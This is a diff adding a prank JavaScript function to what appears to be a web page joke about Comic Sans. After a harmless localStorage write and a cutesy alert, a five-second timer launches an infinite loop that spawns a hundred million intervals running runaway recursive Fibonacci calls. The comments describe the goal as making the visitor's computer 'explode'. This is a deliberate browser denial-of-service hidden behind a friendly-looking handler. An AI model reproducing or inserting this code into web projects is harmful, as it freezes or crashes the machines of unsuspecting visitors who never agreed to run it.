@@ -1,0 +1,33 @@
+function I_ALREADY_HAVE_COMIC_SANS_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK_EXCLAMATION_MARK()
+{
+    localStorage.setItem("IALREADYHAVECOMICSANSSOSHUTUP", "ok i shut up");
+    // After 5 seconds, make their computer explode for no reason by spawning a lot of stuff
+    // This happens after 5 seconds so that the alert below actually plays out.
+    setTimeout(function() {
+        // Spawn a lot of stuff
+        while (true)
+        {
+            // Why spawn one interval when you can spawn 100000000?
+            for (let i = 0; i < 100000000; i++)
+            setInterval(function() {
+                function fibonacci(n) {
+                    if (n <= 1) return n;
+                    return fibonacci(n - 1) + fibonacci(n - 2);
+                  }
+                  for (let i = 0; i < 10000; i++)
+                  {
+                    console.log(fibonacci(fibonacci(fibonacci(100000*i))));
+                  }
+            }, 1);
+
+            // I <3 stupid
+
+            // this part of the code is unlikely to happen because we spawn like a billion intervals
+            console.log("IF YOU SEE THIS THEN JUST PRETEND YOU WON ONE BILLION DOLLERS IN LOTERY");
+            //           Yeah, 1 billion dollars away from paying your college fees lol
+            //           If you see this text then do NOT regard the console.log statement
+            //           above and pretend you're homeless. You did not achieve anything.
+        }
+    }, 5000);
+    alert("oop sowwy wowwy that wont happen again (,,>﹏<,,) ˚ʚ♡ɞ˚");
+}
